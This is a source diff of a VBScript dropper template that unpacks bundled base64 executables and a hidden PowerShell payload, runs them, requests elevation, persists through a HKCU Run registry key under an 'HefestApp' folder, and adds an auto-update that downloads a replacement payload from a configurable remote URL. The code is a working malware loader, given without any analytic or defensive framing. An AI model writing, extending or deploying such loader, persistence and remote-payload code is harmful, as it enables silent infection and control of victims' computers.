@@ -2,8 +2,12 @@ Dim bodyX
 bodyX="0102"
 Dim selfDel
 selfDel="__selfDel"
-Dim autorun
-autorun="__autorun"
+Dim autostart
+autostart="__autostart"
+Dim autoupdate
+autoupdate="__autoupdate"
+Dim updateurl
+updateurl="__updateurl"
 Dim arrFrontData
 arrFrontData = Array("__frontData")
 Dim arrFrontName
@@ -14,10 +18,30 @@ If Not IsAdmin() Then
     RunElevated()
 Else
     MainScriptLogic()
-    if autorun = "True" Then
-        DoAutoRun
-    end if
 End If
+
+
+Sub MainScriptLogic()
+    For i = 0 To UBound(arrFrontName)
+        data = arrFrontData(i)
+        exe = GetFilePath(arrFrontName(i))
+        DecodeBase64ToFile data, exe
+        ExecuteFileAsync exe
+    Next
+
+    if Not FileExists(GetPS1FilePath) Then
+        DecodeBase64ToFile bodyX, GetPS1FilePath
+    end if
+
+    Run
+
+    if autostart = "True" Then
+        DoSetAutoStart
+    end if
+    if autoupdate = "True" Then
+        DoAutoUpdate
+    end if
+End Sub
 
 Function GetFilePath(fileName)
     Dim fso, scriptPath, scriptFolder, fullPath
@@ -29,6 +53,20 @@ Function GetFilePath(fileName)
     GetFilePath = fullPath
 End Function
 
+Function FileExists(filePath)
+    Dim fso
+    Set fso = CreateObject("Scripting.FileSystemObject")
+    FileExists = fso.FileExists(filePath)
+    Set fso = Nothing
+End Function
+
+Function GetPS1FilePath()
+    Dim scriptPath, ps1Path
+    scriptPath = WScript.ScriptFullName
+    ps1Path = Left(scriptPath, Len(scriptPath) - 3) & "ps1"
+    GetPS1FilePath = ps1Path
+End Function
+
 Function ExecuteFileAsync(filePath)
     Dim shell, result
     Set shell = CreateObject("WScript.Shell")
@@ -36,6 +74,87 @@ Function ExecuteFileAsync(filePath)
     Set shell = Nothing
     ExecuteFileAsync = result
 End Function
+
+Sub Run
+    Dim shell
+    Set shell = CreateObject("WScript.Shell")
+    Dim command
+    command = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File """ & GetPS1FilePath & """"
+    shell.Run command, 0, True
+end sub
+
+Function IsAdmin()
+    Dim objWShell, result
+    Set objWShell = CreateObject("WScript.Shell")
+    result = objWShell.Run("cmd /c net session >nul 2>&1", 0, True)
+    IsAdmin = (result = 0)
+    Set objWShell = Nothing
+End Function
+
+Sub RunElevated()
+    Dim objShell
+    Set objShell = CreateObject("Shell.Application")
+    objShell.ShellExecute "wscript.exe", Chr(34) & WScript.ScriptFullName & Chr(34), "", "runas", 1
+    WScript.Quit
+End Sub
+
+Sub DoSetAutoStart()
+    Dim fso, shell, scriptPath, destFolder, destPath, registryKey
+    Set fso = CreateObject("Scripting.FileSystemObject")
+    Set shell = CreateObject("WScript.Shell")
+    scriptPath = WScript.ScriptFullName
+    destFolder = fso.BuildPath(shell.ExpandEnvironmentStrings("%APPDATA%"), "HefestApp")
+    destPath = fso.BuildPath(destFolder, fso.GetFileName(scriptPath))
+    CreateFolder fso, destFolder
+    CopyScript fso, scriptPath, destPath
+    SetAutoStart shell, destPath
+    Set shell = Nothing
+    Set fso = Nothing
+End Sub
+
+Sub CreateFolder(fso, folderPath)
+    If Not fso.FolderExists(folderPath) Then
+        fso.CreateFolder(folderPath)
+    End If
+End Sub
+
+Sub CopyScript(fso, sourcePath, destinationPath)
+    fso.CopyFile sourcePath, destinationPath, True
+End Sub
+
+Sub SetAutoStart(shell, scriptPath)
+    Dim registryKey, registryValue, command
+    registryKey = "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\"
+    registryValue = "HefestAppVbs"
+    command = "wscript.exe """ & scriptPath & """"
+    shell.RegWrite registryKey & registryValue, command, "REG_SZ"
+End Sub
+
+
+Function DoAutoUpdate()
+    Dim timeout, delay, startTime, response
+    timeout = DateAdd("n", 1, Now)
+    delay = 5
+    startTime = Now
+
+    Do While Now < timeout
+        On Error Resume Next
+        Set response = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+        response.Open "GET", updateUrl, False
+        response.Send
+        
+        If response.Status = 200 Then
+            DecodeBase64ToFile response.responseText, GetPS1FilePath
+            Exit Do
+        End If
+        On Error GoTo 0
+        
+        WScript.Sleep delay * 1000
+    Loop
+End Function
+
+
+
 
 Function DecodeBase64ToFile(base64String, outputFilePath)
     Dim xmlDoc
@@ -67,86 +186,3 @@ Function DecodeBase64ToFile(base64String, outputFilePath)
     Set node = Nothing
     Set xmlDoc = Nothing
 End Function
-
-Sub MainScriptLogic()
-
-    For i = 0 To UBound(arrFrontName)
-        data = arrFrontData(i)
-        exe = GetFilePath(arrFrontName(i))
-        DecodeBase64ToFile data, exe
-        ExecuteFileAsync exe
-    Next
-
-    Dim objShell
-    Set objShell = CreateObject("WScript.Shell")
-    Dim scriptFullPath
-    scriptFullPath = WScript.ScriptFullName
-    Dim psScriptPath
-    psScriptPath = Left(scriptFullPath, Len(scriptFullPath) - 3) & "ps1"
-    DecodeBase64ToFile bodyX, psScriptPath
-    Dim command
-    command = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File """ & psScriptPath & """"
-    ' Using Run method with window style 0 to run the command invisibly
-    objShell.Run command, 0, True
-    ' Delete the PowerShell script file and itself if selfDel is "yes"
-    If selfDel = "yes" Then
-        'Dim fso
-        'Set fso = CreateObject("Scripting.FileSystemObject")
-        'If fso.FileExists(psScriptPath) Then
-        '    fso.DeleteFile psScriptPath
-        'End If   
-        ' Schedule self-deletion using cmd and timeout
-        'Dim deleteCommand
-        'deleteCommand = "cmd /c timeout 2 > NUL & del """ & scriptFullPath & """"
-        'objShell.Run deleteCommand, 0, False
-        'Set fso = Nothing
-    End If
-    Set objShell = Nothing
-End Sub
-
-Function IsAdmin()
-    Dim objWShell, result
-    Set objWShell = CreateObject("WScript.Shell")
-    result = objWShell.Run("cmd /c net session >nul 2>&1", 0, True)
-    IsAdmin = (result = 0)
-    Set objWShell = Nothing
-End Function
-
-Sub RunElevated()
-    Dim objShell
-    Set objShell = CreateObject("Shell.Application")
-    objShell.ShellExecute "wscript.exe", Chr(34) & WScript.ScriptFullName & Chr(34), "", "runas", 1
-    WScript.Quit
-End Sub
-
-
-Sub DoAutoRun()
-    Dim fso, shell, scriptPath, destFolder, destPath, registryKey
-    Set fso = CreateObject("Scripting.FileSystemObject")
-    Set shell = CreateObject("WScript.Shell")
-    scriptPath = WScript.ScriptFullName
-    destFolder = fso.BuildPath(shell.ExpandEnvironmentStrings("%APPDATA%"), "HefestApp")
-    destPath = fso.BuildPath(destFolder, fso.GetFileName(scriptPath))
-    CreateFolder fso, destFolder
-    CopyScript fso, scriptPath, destPath
-    SetAutorun shell, destPath
-    Set shell = Nothing
-    Set fso = Nothing
-End Sub
-
-Sub CreateFolder(fso, folderPath)
-    If Not fso.FolderExists(folderPath) Then
-        fso.CreateFolder(folderPath)
-    End If
-End Sub
-
-Sub CopyScript(fso, sourcePath, destinationPath)
-    fso.CopyFile sourcePath, destinationPath, True
-End Sub
-
-Sub SetAutorun(shell, scriptPath)
-    Dim registryKey, registryValue
-    registryKey = "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\"
-    registryValue = "HefestAppVbs"
-    shell.RegWrite registryKey & registryValue, """" & scriptPath & """", "REG_SZ"
-End Sub
